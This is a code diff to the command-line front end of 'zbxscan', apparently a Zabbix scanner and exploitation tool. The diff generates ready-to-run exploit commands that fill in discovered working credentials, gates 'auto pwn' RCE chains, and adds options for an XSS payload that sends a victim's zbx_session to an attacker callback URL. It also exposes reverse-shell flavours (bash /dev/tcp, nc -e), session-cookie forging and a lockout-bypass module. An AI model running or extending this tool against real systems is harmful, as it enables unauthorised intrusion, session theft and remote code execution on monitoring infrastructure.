@@ -4,6 +4,7 @@ from __future__ import annotations
 import argparse
 import csv
 import json
+import shlex
 import sys
 
 from . import db, passive, fingerprint
@@ -20,14 +21,26 @@ def _human_bool(b: bool | None) -> str:
 
 
 def _print_fingerprint(fp: fingerprint.Fingerprint) -> None:
-    print(f"\n== {fp.target}  ({fp.host}:{fp.port})")
+    origin = f"{fp.host}:{fp.port}" + (f" {fp.scheme}" if fp.scheme else "")
+    print(f"\n== {fp.target}  ({origin})")
     print(f"   frontend: {fp.base or '/'}  web={_human_bool(fp.web)}  api={_human_bool(fp.api)}")
     if fp.version:
-        print(f"   version:  {fp.version}  (branch {fp.branch})")
+        if fp.version_approx:
+            print(f"   version:  ~{fp.version}  (branch {fp.branch}, "
+                  f"approx from HTML — patch unknown; apiinfo unavailable)")
+        else:
+            print(f"   version:  {fp.version}  (branch {fp.branch})")
     if fp.server_header:
         print(f"   server:   {fp.server_header}")
     if fp.x_powered_by:
         print(f"   php:      {fp.x_powered_by}")
+    svc = []
+    if fp.agent_port_open is not None:
+        svc.append(f"agent 10050/tcp {'open' if fp.agent_port_open else 'closed'}")
+    if fp.server_port_open is not None:
+        svc.append(f"trapper 10051/tcp {'open' if fp.server_port_open else 'closed'}")
+    if svc:
+        print(f"   services: " + ", ".join(svc))
     for n in fp.notes:
         print(f"   [i] {n}")
 
@@ -121,7 +134,7 @@ def _print_hits(report: passive.TargetReport, expand_components: bool = False,
     if not hits and not expand_components:
         print(_c(YELLOW, "   [*] no vulnerability records match this version"))
         return
-    # — затронутые уязвимости, по критичности, в строчку —
+    # — affected vulnerabilities, by severity, one line —
     if hits:
         buckets = {"CRIT": [], "HIGH": [], "MED": [], "LOW": []}
         for h in hits:
@@ -153,6 +166,9 @@ def _print_hits(report: passive.TargetReport, expand_components: bool = False,
         if report.creds_reevaluated:
             print(_c(90, "       (conditions re-evaluated with the working default creds)"))
     # — auto pwn: chains that lead to RCE —
+    # Gate on condition_status == "pass": suggest auto-pwn only when every required
+    # component/prerequisite was actually verified (condition re-evaluated with the
+    # working creds when available). "unknown"/"fail" → not ready for autopwn.
     apwn = []
     for h in hits:
         cls = find(h.record["id"])
@@ -161,21 +177,24 @@ def _print_hits(report: passive.TargetReport, expand_components: bool = False,
         usage = getattr(cls, "usage", "") or ""
         if "installer-level" in usage or "not remote" in usage:
             continue
+        if h.condition_status != "pass":
+            continue
         if h.record["type"] in RCE_TYPES or ("RCE" in usage.upper() and "->" in usage):
             apwn.append(h)
     if apwn:
         cred = next((c for c in report.creds if c.ok), None)
-        creds_opt = (f"--user {cred.username} --password {cred.password}" if cred
-                     else "--user <u> --password <p>")
+        creds_opt = (f"--user {shlex.quote(cred.username)} --password {shlex.quote(cred.password)}"
+                     if cred else "--user <u> --password <p>")
         print("\n" + _c(BOLD + 91, "   [+] HAVE AUTO PWN:"))
         for h in sorted(apwn, key=lambda x: x.record["id"]):
             r = h.record
             cmd = f"zbxscan -a -t {report.target} -exp {r['id']} {creds_opt}" + (
                 " --cmd 'id'" if r["type"] in RCE_TYPES else "")
             print(_c("1;91", "      " + r["id"]) + f" ({_type_label(r)})  " + _c(90, cmd))
-    # — к чему есть эксплуатация —
+    # — what has an exploit —
     exploitable = [h for h in hits
-                   if h.record["id"] in REGISTRY_IDX or h.condition_status == "pass"]
+                   if (h.record["id"] in REGISTRY_IDX or h.condition_status == "pass")
+                   and h.condition_status != "fail"]
     if exploitable:
         if show_commands:
             print("\n" + _c(BOLD, "   [+] Ready exploit commands:"))
@@ -187,7 +206,7 @@ def _print_hits(report: passive.TargetReport, expand_components: bool = False,
         else:
             print("\n" + _c(BOLD, f"   [+] {len(exploitable)} exploitable (module/PoC)"))
             print(_c(90, "       use --exploits to see ready exploit commands"))
-    # — компонентные CVE —
+    # — component CVEs —
     if report.components:
         n = len(report.components)
         print("\n" + _c(BOLD, f"   [+] FOUND {n} component CVE(s)")
@@ -244,7 +263,13 @@ def _report_json(rep: passive.TargetReport) -> dict:
     return {
         "target": rep.target,
         "fingerprint": {"version": rep.fp.version, "branch": rep.fp.branch,
-                        "base": rep.fp.base, "api": rep.fp.api, "web": rep.fp.web,
+                        "version_approx": rep.fp.version_approx,
+                        "sso_enabled": rep.fp.sso_enabled,
+                        "agent_port_open": rep.fp.agent_port_open,
+                        "server_port_open": rep.fp.server_port_open,
+                        "version_source": rep.fp.version_source,
+                        "base": rep.fp.base, "scheme": rep.fp.scheme,
+                        "api": rep.fp.api, "web": rep.fp.web,
                         "server": rep.fp.server_header, "php": rep.fp.x_powered_by,
                         "sso_present": rep.fp.sso_present},
         "hits": [
@@ -262,6 +287,7 @@ def _report_json(rep: passive.TargetReport) -> dict:
              "type": h.record["type"],
              "cmd": f"zbxscan -a -t {rep.target} -exp {h.record['id']} " + (("--cmd 'id'") if h.record["type"] in ("rce","sql-injection","command-injection","saml-sso-bypass") else "")}
             for h in rep.hits if h.record["id"] in REGISTRY_IDX
+            and h.condition_status != "fail"
         ],
         "found_component_cves": len(rep.components),
         "components": [{"id": c["id"], "component": c.get("stack_component"),
@@ -271,14 +297,22 @@ def _report_json(rep: passive.TargetReport) -> dict:
                   for c in rep.creds],
         "auth_context": {k: v for k, v in ctx.items() if k not in ("token", "rules")} if ctx else None,
         "auth_methods": (ctx.get("auth_methods") or {}) if ctx else None,
+        "creds_reevaluated": rep.creds_reevaluated,
         "auto_chain": [
-            {"id": h.record["id"], "cmd": f"zbxscan -a -t {rep.target} -exp {h.record['id']} "
-                                    "--user <u> --password <p> --cmd 'id'"}
+            {"id": h.record["id"], "cmd": _auto_chain_cmd(rep, h)}
             for h in rep.hits if h.condition_status == "pass"
             and h.record["type"] in {"rce", "sql-injection", "saml-sso-bypass", "command-injection"}
         ],
         "notes": rep.notes,
     }
+
+
+def _auto_chain_cmd(rep: "passive.TargetReport", h: "passive.VulnHit") -> str:
+    """Ready-to-run command for an RCE chain; uses verified creds when present."""
+    cred = next((c for c in rep.creds if c.ok), None)
+    creds_opt = (f"--user {shlex.quote(cred.username)} --password {shlex.quote(cred.password)}"
+                 if cred else "--user <u> --password <p>")
+    return (f"zbxscan -a -t {rep.target} -exp {h.record['id']} {creds_opt} --cmd 'id'")
 
 
 def _print_hosts_import(rep: passive.TargetReport) -> None:
@@ -304,6 +338,31 @@ def _print_hosts_import(rep: passive.TargetReport) -> None:
         probe.close()
 
 
+def _looks_like_target(s: str) -> bool:
+    """A plain host[:port] (IPv4/hostname/IPv6), optionally with an http(s)://
+    scheme. Rejects paths (/, \\, ..) and blank/whitespace so `-t ../tests`
+    isn't scanned as a host."""
+    s = s.strip()
+    if not s or any(ch in s for ch in " \t"):
+        return False
+    if "://" in s:
+        scheme, rest = s.split("://", 1)
+        if scheme.lower() not in ("http", "https") or not rest:
+            return False
+        s = rest
+    if "/" in s or "\\" in s or ".." in s:
+        return False
+    return True
+
+
+def _x_targets(listuv: list[str]) -> list[str]:
+    bad = [t for t in listuv if not _looks_like_target(t)]
+    if bad:
+        _err = ", ".join(repr(b) for b in bad)
+        raise SystemExit(f"invalid target(s) {_err}: expected HOST[:PORT]; use -l <file> for a list/target file")
+    return listuv
+
+
 def cmd_passive(args: argparse.Namespace) -> int:
     targets: list[str] = []
     if args.targets:
@@ -315,6 +374,7 @@ def cmd_passive(args: argparse.Namespace) -> int:
                     cell = cell.strip()
                     if cell and not cell.startswith("#"):
                         targets.append(cell)
+    _x_targets(targets)
     if not targets:
         print("no targets: pass -t <host[:port]> or -l <file>", file=sys.stderr)
         return 2
@@ -348,6 +408,9 @@ def cmd_passive(args: argparse.Namespace) -> int:
 
 
 def cmd_active(args: argparse.Namespace) -> int:
+    if args.targets and not all(_looks_like_target(t) for t in args.targets):
+        print("invalid target: expected HOST[:PORT]", file=sys.stderr)
+        return 2
     if not args.targets or len(args.targets) != 1:
         print("-m active requires exactly one -t <target>", file=sys.stderr)
         return 2
@@ -382,7 +445,9 @@ def cmd_active(args: argparse.Namespace) -> int:
         "shell": args.shell, "revshell": args.revshell, "revshell-shell": args.revshell_shell,
         "sql-auto": args.sql_auto,
         "xss-callback": args.xss_callback, "xss-mode": args.xss_mode,
-        "xss-cleanup": args.xss_cleanup, "seed-key": args.seed_key,
+        "xss-cleanup": args.xss_cleanup, "xss-listen": args.xss_listen,
+        "xss-port": args.xss_port, "xss-wait": args.xss_wait,
+        "xss-beacon": args.xss_beacon, "seed-key": args.seed_key,
     }.items() if v is not None}
     for name in mod.args:
         val = getattr(args, name.replace("-", "_"), None)
@@ -461,7 +526,13 @@ def main(argv: list[str] | None = None) -> int:
         argv = sys.argv[1:]
     argv = _rewrite_argv(argv)
     ap = argparse.ArgumentParser(prog="zbxscan", description="Zabbix vulnerability scanner")
-    ap.add_argument("-m", "--mode", choices=["passive", "active"], required=True)
+    # mode: positional first (zbxscan passive|active) and/or -m/--mode; auto-inferred
+    # when absent: -exp/--exp means active, otherwise passive
+    ap.add_argument("mode_positional", nargs="?", choices=["passive", "active"],
+                    metavar="{passive,active}",
+                    help="mode as positional: `zbxscan passive -t HOST` (or -m/--mode)")
+    ap.add_argument("-m", "--mode", dest="mode_opt", choices=["passive", "active"],
+                    help="mode (alternative to positional; auto: -exp => active, else passive)")
     ap.add_argument("-t", "--targets", action="append", metavar="HOST[:PORT]",
                     help="single target (repeatable; active mode: exactly one)")
     ap.add_argument("-l", "--list-file", metavar="FILE", help="target list (one per line / csv)")
@@ -478,10 +549,21 @@ def main(argv: list[str] | None = None) -> int:
                     help="payload flavour for --revshell (bash /dev/tcp, nc -e, busybox fifo+nc)")
     ap.add_argument("--xss-callback", default=None, metavar="URL",
                     help="XSS payload: attacker URL receiving the victim's zbx_session")
-    ap.add_argument("--xss-mode", default=None, choices=["full", "dry", "beacon"],
-                    help="XSS payload mode: full (create+execute as victim), dry, beacon")
+    ap.add_argument("--xss-mode", default=None, choices=["full", "dry", "beacon", "verify"],
+                    help="XSS payload mode: full (create+execute as victim: RCE), verify "
+                         "(create-only script with the beacon phrase: XSS proof), dry, beacon")
     ap.add_argument("--xss-cleanup", default="1",
                     help="XSS payload: delete the created script after execution (1/0)")
+    ap.add_argument("--xss-listen", default=None, choices=["0", "1"],
+                    help="XSS module: run a local HTTP listener (127.0.0.1:--xss-port) and "
+                         "return a verdict from the victim's callback (beacon/cookie/RCE)")
+    ap.add_argument("--xss-port", type=int, default=None,
+                    help="XSS module: local callback listener port (default 8123)")
+    ap.add_argument("--xss-wait", type=float, default=None,
+                    help="XSS module: seconds to wait for the victim callback (default 180)")
+    ap.add_argument("--xss-beacon", default=None,
+                    help="XSS module: beacon message exfiltrated with ?m= (default "
+                         "\"Hi! It's a XSS from MN3STRASHN0\")")
     ap.add_argument("--seed-key", default=None,
                     help="session signing key for cookie-forge modules (CVE-2026-23933/36466); 'auto' reads from --db-host")
     ap.add_argument("--sql-auto", action="store_true",
@@ -505,6 +587,8 @@ def main(argv: list[str] | None = None) -> int:
     ap.add_argument("--host", help="active-agent hostname (heartbeat / trapper modules)")
     ap.add_argument("--pass-wrong", help="username for wrong-password attempts (lockout-bypass module)")
     ap.add_argument("--container", help="container-name payload (agent2 docker plugin module)")
+    ap.add_argument("--inject", help="CVE-2016-4338: injection value for the agent userparameter")
+    ap.add_argument("--script", help="CVE-2016-4338: executable path on the agent to auto-run via dash [[")
     ap.add_argument("--sleep", default="10", help="CVE-2025-27240: sleep seconds for the time-based payload")
     ap.add_argument("--payload", default="sleep", choices=["sleep", "error"],
                     help="CVE-2025-27240: sleep (timing oracle) or error (log-marker) payload")
@@ -523,10 +607,11 @@ def main(argv: list[str] | None = None) -> int:
     ap.add_argument("--list-cves", action="store_true", help="dump the vulnerability database")
     ap.add_argument("--branch", help="with --list-cves: filter by branch")
     args = ap.parse_args(argv)
-
+    # resolve mode: positional > -m/--mode > auto (-exp => active, else passive)
+    mode = args.mode_positional or args.mode_opt or ("active" if args.exp else "passive")
     if args.list_cves:
         return cmd_list(args)
-    if args.mode == "passive":
+    if mode == "passive":
         return cmd_passive(args)
     return cmd_active(args)
 
